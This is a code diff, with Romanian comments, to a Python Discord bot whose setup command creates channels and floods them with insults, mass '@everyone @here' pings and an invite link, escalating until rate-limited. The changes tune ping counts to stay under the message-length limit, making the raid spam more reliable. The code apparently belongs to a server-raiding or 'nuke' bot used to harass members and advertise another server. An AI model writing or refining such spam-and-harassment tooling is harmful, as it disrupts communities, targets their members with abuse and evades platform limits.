@@ -349,25 +349,30 @@ async def setup(ctx):
             for i in range(15):
                 # Trimite embed
                 await channel.send(embed=embed_content)
-                await asyncio.sleep(0.2)  # pauză scurtă
+                await asyncio.sleep(0.2)
 
-                # Construiește textul cu ping-uri random și insultă
-                ping_count = random.randint(5, 50)
+                # Construiește textul cu ping-uri random (maxim 35 pentru a nu depăși 2000 caractere) și insultă
+                ping_count = random.randint(5, 35)
                 insult = random.choice(insults)
                 ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 final_message = f"{insult}\n\n{ping_message}"
+                # Verifică lungimea (siguranță)
+                if len(final_message) > 2000:
+                    final_message = final_message[:1990] + "..."
                 await channel.send(content=final_message)
                 await asyncio.sleep(0.2)
 
             # ----- Faza 2: spam crescător (2,4,6,8,10,12,14,16,18,20...) până la rate-limit -----
             step = 2
-            max_pings = 60  # limită de siguranță
+            max_pings = 35  # limită pentru a nu depăși 2000 caractere
             for ping_count in range(2, max_pings + 1, step):
                 insult = random.choice(insults)
                 ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 final_message = f"{insult}\n\n{ping_message}"
+                if len(final_message) > 2000:
+                    final_message = final_message[:1990] + "..."
                 await channel.send(content=final_message)
-                await asyncio.sleep(0.1)  # pauză foarte mică
+                await asyncio.sleep(0.1)
 
         except discord.HTTPException as e:
             if e.status == 429:  # Rate limit
@@ -390,7 +395,7 @@ async def setup(ctx):
             ch = await guild.create_text_channel(name=styled_name)
             created_channels.append(ch)
 
-            # Trimite mesajele pe canal (nu mai avem send_initial_messages separată)
+            # Trimite mesajele pe canal
             await send_messages_to_channel(ch)
 
         except Exception as e:
